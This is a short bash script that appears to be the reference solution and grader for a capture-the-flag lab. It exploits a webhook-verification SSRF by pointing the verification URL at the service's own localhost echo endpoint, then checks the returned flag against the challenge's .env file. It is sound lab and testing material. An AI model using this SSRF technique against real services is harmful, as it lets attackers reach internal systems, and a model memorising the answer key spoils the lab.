#!/usr/bin/env bash
# ============================================================
# CallbackListener (labs07) — reference solution: SSRF via
# webhook verification (no URL allowlisting)
#
# Chain: register a webhook whose verification URL points at
# the service itself (POST /api/echo echoes the challenge) —
# a self-referencing SSRF that never exposes operator
# infrastructure. Flag in the registration response.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8087)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8087}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] registering webhook with a self-referencing verification URL" >&2
RESP="$(curl -fsS -X POST "$BASE/api/webhooks" -H 'Content-Type: application/json' \
  -d '{"url":"http://localhost:5000/api/echo","event":"order.created"}')"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
